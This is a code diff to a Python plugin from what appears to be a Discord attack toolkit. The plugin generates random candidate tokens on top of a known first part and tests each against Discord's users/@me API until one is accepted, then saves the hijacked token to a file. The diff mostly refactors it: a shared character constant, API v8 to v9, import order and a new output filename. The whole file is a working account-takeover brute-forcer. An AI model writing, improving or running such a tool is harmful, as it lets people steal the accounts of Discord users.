@@ -1,4 +1,4 @@
-# Copyright (c) 2025 v4lkyr0
+# Copyright (c) 2026 v4lkyr0
 # See LICENSE file for details
 
 from Plugins.Utils import *
@@ -6,10 +6,10 @@ from Plugins.Config import *
 
 try:
     import base64
-    import requests
     import random
-    import threading
+    import requests
     import string
+    import threading
     import time
 except Exception as e:
     MissingModule(e)
@@ -44,12 +44,13 @@ try:
         if token_found.is_set():
             return
 
-        second_part_token = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(6))
-        third_part_token  = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(38))
+        TOKEN_CHARS = string.ascii_letters + string.digits + '-_'
+        second_part_token = ''.join(random.choice(TOKEN_CHARS) for _ in range(6))
+        third_part_token  = ''.join(random.choice(TOKEN_CHARS) for _ in range(38))
         all_parts_token   = f"{first_part}.{second_part_token}.{third_part_token}"
 
         try:
-            response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': all_parts_token, 'Content-Type': 'application/json'})
+            response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': all_parts_token, 'Content-Type': 'application/json'})
             if response.status_code == 200:
                 found_token[0] = all_parts_token
                 token_found.set()
@@ -79,7 +80,7 @@ try:
 
     if found_token[0]:
         SaveToken(found_token[0])
-        print(f'{INFO} Token saved in {red}"{white}Programs/Extras/DiscordTokens.txt{red}"{white}.', reset)
+        print(f'{INFO} Token saved in {red}"{white}Programs/Extras/Buildware.json{red}"{white}.', reset)
 
     Continue()
     Reset()
